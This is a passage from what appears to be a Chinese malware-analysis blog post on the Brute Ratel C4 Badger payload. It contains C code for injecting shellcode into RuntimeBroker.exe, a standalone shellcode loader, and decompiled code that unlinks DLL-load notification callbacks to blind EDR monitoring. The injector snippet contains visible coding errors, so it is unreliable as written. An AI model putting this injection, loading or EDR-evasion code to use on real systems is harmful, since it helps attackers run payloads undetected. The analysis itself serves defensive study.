class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">find_process</span><span class="params">(  <span class="type">wchar_t</span> *process_name)</span> </span>&#123;</span><br><span class="line">    PROCESSENTRY32 process_entry;</span><br><span class="line">    process_entry.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Take a snapshot of all processes in the system</span></span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (snapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;CreateToolhelp32Snapshot failed&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve information about the first process</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;process_entry) == TRUE) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// Compare the name of the process with the desired process name</span></span><br><span class="line">           <span class="keyword">if</span> (_wcsicmp(process_entry.szExeFile, process_name) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">                <span class="keyword">return</span> process_entry.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(snapshot, &amp;process_entry) == TRUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close the snapshot handle</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">     <span class="type">wchar_t</span>  targetThreadName[]=<span class="string">L&quot;RuntimeBroker.exe&quot;</span>; </span><br><span class="line">    DWORD threadId = <span class="built_in">find_process</span>(targetThreadName);</span><br><span class="line">    HANDLE hprocess=<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS,<span class="literal">false</span>,threadId);</span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;shellcode.bin&quot;</span>, GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">int</span> fileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    LPVOID remote_process_buffer=<span class="built_in">VirtualAllocEx</span>(hprocess,<span class="literal">NULL</span>,<span class="built_in">sizeof</span>(fileSize), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//使用WriteProcessMemory函数将我们的shellcode写入分配的内存区域。</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hprocess, remote_process_buffer, hFile, fileSize, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CreateRemoteThread</span>(hFile, <span class="literal">NULL</span>, <span class="number">0</span>,(LPTHREAD_START_ROUTINE) remote_process_buffer,<span class="literal">NULL</span>,<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="阶段三：分析shellcode"><a href="#阶段三：分析shellcode" class="headerlink" title="阶段三：分析shellcode"></a>阶段三：分析shellcode</h2><p>这个文件的作用是释放Brute Ratel C4 Badger的payload</p>
<h3 id="任务一：手动加载shllcode"><a href="#任务一：手动加载shllcode" class="headerlink" title="任务一：手动加载shllcode"></a>任务一：手动加载shllcode</h3><p>将dump下来的shellcode.bin文件使用编写的shellcode loader运行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span>  </span><br><span class="line">&#123;</span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">OVERLAPPED ol = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">HANDLE hFile = CreateFileW(<span class="string">L&quot;shellcode.bin&quot;</span>, GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">LPVOID lpShellCode = VirtualAlloc(<span class="literal">NULL</span>, fileSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">ReadFileEx(hFile, lpShellCode, fileSize, &amp;ol, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line">VirtualProtect(lpShellCode, fileSize, PAGE_EXECUTE_READ, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">((<span class="type">void</span>(*)())lpShellCode)();</span><br><span class="line"></span><br><span class="line">WaitForSingleObject((HANDLE)<span class="number">-1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="任务二：shellcode分析"><a href="#任务二：shellcode分析" class="headerlink" title="任务二：shellcode分析"></a>任务二：shellcode分析</h3><p>shellcode开头有巨量的<code>mov</code>和<code>push</code>执行的组合，通过压入栈中的数据可以判断大致是在初始化数据和函数调用要用到的参数等等<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/ff3cd0cc1cf2275d79a4cc8f2201c8e3-1729856382212-32.png"></p>
<p>通过访问0x3C位置AddressOfNewExeHeader开始解析此PE文件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/b0ee86796b47c330d10694da07ea7a6e-1729856379208-30.png"><br>查看rsp寄存器内存，可以发现压入栈中的众多数据包含了一个PE文件并且此PE文件的Dos头的MZSignature被抹除防止EDR进行内存扫描查杀，<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/1525aaaa197f5466179e180c90a33a9b-1729856377647-28.png"></p>
<p>最终获取导出函数的RVA：0x92E0<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/f845c826fb7095d016e6226e3845d77c-1729856375664-26.png"></p>
<p>通过<code>PEB-Ldr-&gt;InMemoryOrderModuleList</code>获取ntdll.dll的基址<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/cd6358540000e39df82ed269c5c6f079-1729856372867-24.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6dd3b690783d860fb18a7bce7a3b950f-1729856371428-22.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/b48ff8824a9533e550e30e2b0b45faf4-1729856369783-20.png"><br>值得一提的是：<br>需要调用api都是通过hash算法获取API的名称然后进行调用的 （加密与解密P557),这样可以提升逆向分析难度，也可以缩小shellcode的体积<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/5f87fe60e97207e05219bc2a8d1dab8c-1729856367920-18.png"></p>
<p>调用searchByHash函数（上述函数重命名）通过Hash获取6个对应函数的地址<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/3c3b87d7263ff3eabb6963437eebd4fe-1729856365920-16.png"></p>
<p>调用NtAllocateVirtualMemory分配指定的内存空间，然后再把payload的ShellCode代码拷贝到该内存空间当中，如下所示：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/dd418279fd9ab31d56d1c8d55a38cb07-1729856363775-14.png"><br>使用Windows API调用NtProtectVirtualMemory更改新分配的内存块的保护。<br>调用NtProtectVirtualMemory修改该内存的属性，如下所示：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/cdb9d88265d399fb1f33f3d3df695f68-1729856362427-12.png"></p>
<p>调用NtCreateThreadEx启动线程代码，如下所示<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6016290aafad449c4706d4de1dc10c28-1729856361182-10.png">调用ZwWaitForSingleObject函数等待线程执行完毕<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/10133dd274e43af0a8694462f571dabf-1729856356145-8.png"></p>
<p>在线程中释放Brute Ratel C4 Badger的攻击载荷，badger与cobalt strike十分相似。在此略去。<br>下面这一apt就是相似的攻击链加载cobalt strike载荷<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/368777.html">响尾蛇组织使用DLL劫持加载Cobalt Strike攻击巴基斯坦政府 - FreeBuf网络安全行业门户</a></p>
<h2 id="BRC-4最终有效载荷"><a href="#BRC-4最终有效载荷" class="headerlink" title="BRC 4最终有效载荷"></a>BRC 4最终有效载荷</h2><h3 id="Unregister-DLL-load-callbacks-取消注册DLL加载回调"><a href="#Unregister-DLL-load-callbacks-取消注册DLL加载回调" class="headerlink" title="Unregister DLL load callbacks  取消注册DLL加载回调"></a>Unregister DLL load callbacks  <strong>取消注册DLL加载回调</strong></h3><blockquote>
<p>某些EDR产品可能会在内核级别注册其函数回调，以接收来自DLL加载或卸载事件的遥测。<br>为了绕过这一点，使用了一种技术，其中注册了一个空的回调函数，该回调函数被添加到已注册回调函数链的末尾。回调列表存储在循环双向链表中，其中最后一个元素指向链中的第一个元素。<br>通过找到指向链开始的指针，该技术可以遍历列表并取消链接所有已注册的回调，如果EDR已经在内核级别注册了自己的回调函数，则可以有效地抑制EDR接收DLL加载和卸载遥测的尝试</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检索注册回调函数列表的末尾</span></span><br><span class="line">end_of_list = (PLDR_DLL_NOTIFICATION_ENTRY)ret_head_of_reg_callback_funcs();</span><br><span class="line"><span class="keyword">if</span> (end_of_list)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 从列表末尾开始，反向遍历到开头</span></span><br><span class="line">    <span class="keyword">for</span> (head = (PLDR_DLL_NOTIFICATION_ENTRY)end_of_list-&gt;List.Flink; </span><br><span class="line">         head != end_of_list; </span><br><span class="line">         head = flink) <span class="comment">// 遍历回调列表，取消节点链接</span></span><br><span class="line">    &#123;</span><br><span class="line">        flink = (PLDR_DLL_NOTIFICATION_ENTRY)head-&gt;List.Flink;</span><br><span class="line">        blink = head-&gt;List.Blink;</span><br><span class="line">        <span class="comment">// 从列表中取消当前节点的链接</span></span><br><span class="line">        flink-&gt;List.Blink = blink;</span><br><span class="line">        blink-&gt;Flink = &amp;flink-&gt;List;</span><br><span class="line">        head-&gt;List.Flink = <span class="number">0LL</span>;</span><br><span class="line">        head-&gt;List.Blink = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> end_of_list;</span><br></pre></td></tr></table></figure>

<p>这段代码片段遍历了<code>PLDR_DLL_NOTIFICATION_ENTRY</code>结构体的双向链表，这些结构体代表注册的DLL加载和卸载事件的回调函数。它从列表中取消每个节点的链接，有效地移除了所有注册的回调。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/f6779ff7924f38d2cb3a6e1deaca7a09-1729856351678-6.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```</span><br></pre></td></tr></table></figure>
<p>typedef struct _LDR_DLL_NOTIFICATION_ENTRY {<br>    LIST_ENTRY                     List;<br>    PLDR_DLL_NOTIFICATION_FUNCTION Callback;<br>    PVOID                          Context;<br>} LDR_DLL_NOTIFICATION_ENTRY, * PLDR_DLL_NOTIFICATION_ENTRY;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">our_callback_cookie = 0LL;</span><br><span class="line">// 在注册回调函数链的末尾注册一个空回调函数</span><br><span class="line">if ((int)LdrRegisterDllNotification(0LL, EmptynotificationFunc, 0LL, &amp;our_callback_cookie) &gt;= 0)</span><br><span class="line">&#123;</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里，代码使用<code>LdrRegisterDllNotification</code>注册了一个空（或虚拟）回调函数。这个函数被添加到现有回调链的末尾。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">while</span> (ntHdrs-&gt;FileHeader.NumberOfSections &gt; (<span class="type">int</span>)i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="type">unsigned</span> <span class="type">int</span>)getNullByteAtEndOfName(secHdrs, <span class="string">&quot;.data&quot;</span>)) <span class="comment">// 检查是否为NULL字节，尝试找到.data节的末尾</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="comment">// 由于我们的回调在回调列表的末尾，我们反向遍历列表</span></span><br><span class="line">        <span class="comment">// 直到找到我们的回调</span></span><br><span class="line">        <span class="keyword">while</span> (our_callback_cookie != entry)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (entry &gt;= (PLDR_DLL_NOTIFICATION_ENTRY)secPtrVA &amp;&amp; v7 &gt;= (<span class="type">char</span> *)entry)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 注销函数回调</span></span><br><span class="line">                LdrUnregisterDllNotification(our_callback_cookie);</span><br><span class="line">                <span class="keyword">return</span> (<span class="type">char</span> *)entry;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 更新条目以获取列表中的下一个节点</span></span><br><span class="line">            entry = (PLDR_DLL_NOTIFICATION_ENTRY)entry-&gt;List.Flink;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>

<p>这段代码寻找DLL（ntdll.dll）的PE头中的特定节，并反向遍历注册回调的列表，直到找到它注册的那个回调（使用<code>our_callback_cookie</code>）。一旦找到，它就使用<code>LdrUnregisterDllNotification</code>注销回调。</p>
<ol>
<li><p><strong>检索回调链尾指针</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">end_of_list = (PLDR_DLL_NOTIFICATION_ENTRY)ret_head_of_reg_callback_funcs();</span><br></pre></td></tr></table></figure>
<p>这行代码调用一个函数以获取DLL通知回调链的尾指针。</p>
</li>
<li><p><strong>遍历并取消链接回调</strong>：<br>如果<code>end_of_list</code>非空，代码将遍历回调链，并取消每个节点的链接：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (head = ...; head != end_of_list; head = flink) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里，<code>List.Flink</code> 和 <code>List.Blink</code> 分别是指向链表中下一个和上一个节点的指针。通过修改这些指针，当前节点从链表中被移除。</p>
</li>
<li><p><strong>注册空回调函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LdrRegisterDllNotification(<span class="number">0LL</span>, EmptynotificationFunc, <span class="number">0LL</span>, &amp;our_callback_cookie);</span><br></pre></td></tr></table></figure>
<p>这行代码使用 <code>LdrRegisterDllNotification</code> 函数注册一个空的回调函数 <code>EmptynotificationFunc</code>。这个空回调被添加到回调链的末尾，用于后续操作。</p>
</li>
<li><p><strong>寻找特定DLL的节信息</strong>：<br>代码通过解析PE头（Portable Executable header）来寻找特定DLL（如ntdll.dll）的节信息，特别是<code>.data</code>节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (ntHdrs-&gt;FileHeader.NumberOfSections &gt; (<span class="type">int</span>)i) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="type">unsigned</span> <span class="type">int</span>)getNullByteAtEndOfName(secHdrs, <span class="string">&quot;.data&quot;</span>)) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这可能用于确定特定数据区域的位置。</p>
</li>
<li><p><strong>反向遍历回调链</strong>：<br>代码使用<code>our_callback_cookie</code>作为起始点，反向遍历回调链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (our_callback_cookie != entry) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目的是找到特定的回调函数或执行某些操作。</p>
</li>
<li><p><strong>注销回调</strong>：<br>当找到特定的回调时，使用 <code>LdrUnregisterDllNotification</code> 函数将其注销：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LdrUnregisterDllNotification(our_callback_cookie);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>整个过程的目的是为了清理或修改现有的DLL加载和卸载通知回调，防止EDR产品接收到这些事件的通知。通过这种方式，可以有效地抑制EDR产品对DLL加载和卸载事件的监控，从而绕过某些安全检测机制。</p>
<p><strong>伪代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">end_of_list=(PLDR_DLL_NOTIFICATION_ENTRY)ret_head_of_reg_callback_funcs();</span><br><span class="line"><span class="keyword">if</span> (end_of_list)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (head = (PLDR_DLL_NOTIFICATION_ENTRY)end_of_list-&gt;List.Flink; head != end_of_list; head = flink )<span class="comment">// walk the list of callbacks, unlinking nodes</span></span><br><span class="line">&#123;</span><br><span class="line">flink = (PLDR_DLL_NOTIFICATION_ENTRY)head-&gt;List.Flink;</span><br><span class="line">blink = head-&gt;List.Blink;</span><br><span class="line">flink-&gt;List.Blink = blink;</span><br><span class="line">blink-&gt;Flink = &amp;flink-&gt;List;</span><br><span class="line">head-&gt;List.Flink = <span class="number">0LL</span>;</span><br><span class="line">head-&gt;List.Blink = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> end_of_list;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">our_callback_cookie = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">int</span>) LdrRegisterDllNotification (<span class="number">0LL</span>, EmptynotificationFunc, <span class="number">0LL</span>, &amp;our_callback_cookie) &gt;= <span class="number">0</span>)<span class="comment">// we register our Empty callback at the end of the chain of</span></span><br><span class="line">i = <span class="number">0LL</span>;</span><br><span class="line">ntHdrs = (IMAGE_NT_HEADERS *) ((<span class="type">char</span> *)ntdll_base_g + ntdll_base_g-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">while</span> (ntHdrs-&gt;FileHeader.NumberOfSections &gt; (<span class="type">int</span>)i)</span><br><span class="line">&#123;</span><br><span class="line">v3 = <span class="number">0x28</span> * i++;</span><br><span class="line"><span class="comment">// each of the sec headers is 0x28 bytes in size</span></span><br><span class="line">sechdrs = (IMAGE_SECTION_HEADER *) ((<span class="type">char</span> *)&amp;ntHdrs-&gt;OptionalHeader + ntHdrs-&gt;FileHeader.SizeOfOptionalHeader + v3);</span><br><span class="line"><span class="keyword">if</span> (!(<span class="type">unsigned</span> <span class="type">int</span>)getNullByteAtEndOfName (secHdrs, <span class="string">&quot;.data&quot;</span>) )<span class="comment">// chk if NULL byte, trying to find the end of .data section for some reason</span></span><br><span class="line">&#123;</span><br><span class="line">PhysicalAddress = secHdrs-&gt;Misc.PhysicalAddress;</span><br><span class="line">secPtrVA = (<span class="type">char</span> *)ntdll_base_g + sechdrs-&gt;VirtualAddress;</span><br><span class="line">entry = (PLDR_DLL_NOTIFICATION_ENTRY)our_callback_cookie-&gt;List.Flink;<span class="comment">// head of the list of registered callbacks</span></span><br><span class="line">v7 = &amp;secPtrVA[<span class="number">4</span> + PhysicalAddress];</span><br><span class="line"><span class="keyword">while</span> (our_callback_cookie != entry) <span class="comment">// since out callback is at the end of the list of callbacks</span></span><br><span class="line"><span class="comment">// we are walking the list backwards untill we hit our callback</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (entry &gt;= (PLDR_DLL_NOTIFICATION_ENTRY)secPtrVA &amp;&amp; v7 &gt;= (<span class="type">char</span> *)entry )</span><br><span class="line">&#123;</span><br><span class="line">LdrUnregisterDllNotification(our_callback_cookie); <span class="comment">// unreg a func callback</span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">char</span> *)entry;</span><br><span class="line">&#125;</span><br><span class="line">entry = (PLDR_DLL_NOTIFICATION_ENTRY)entry-&gt;List.Flink; <span class="comment">// update entry to get the next node in the list</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>dll callback injection：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zha0gongz1/p/17633377.html">https://www.cnblogs.com/zha0gongz1/p/17633377.html</a><br><a target="_blank" rel="noopener" href="https://shorsec.io/blog/dll-notification-injection/">https://shorsec.io/blog/dll-notification-injection/</a><br>项目<br><a target="_blank" rel="noopener" href="https://github.com/ShorSec/DllNotificationInjection">https://github.com/ShorSec/DllNotificationInjection</a></p>
<h3 id="代理DLL加载以隐藏ETWTI堆栈跟踪-Proxying-DLL-Loads-To-Hide-From-ETWTI-Stack-Tracing"><a href="#代理DLL加载以隐藏ETWTI堆栈跟踪-Proxying-DLL-Loads-To-Hide-From-ETWTI-Stack-Tracing" class="headerlink" title="代理DLL加载以隐藏ETWTI堆栈跟踪 Proxying DLL Loads To Hide From ETWTI Stack Tracing"></a><strong>代理DLL加载以隐藏ETWTI堆栈跟踪</strong> Proxying DLL Loads To Hide From ETWTI Stack Tracing</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/./../pic/brute-ratel-C4-badger%E5%85%A8%E5%88%86%E6%9E%90%E6%96%87%E6%A1%A3/6d5695362c23eadf85a83b6dc77b0f7a-1729856342755-4.png"><br><a target="_blank" rel="noopener" href="https://github.com/paranoidninja/Proxy-DLL-Loads">https://github.com/paranoidninja/Proxy-DLL-Loads</a><br><a target="_blank" rel="noopener" href="https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/">https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/</a></p>
<blockquote>
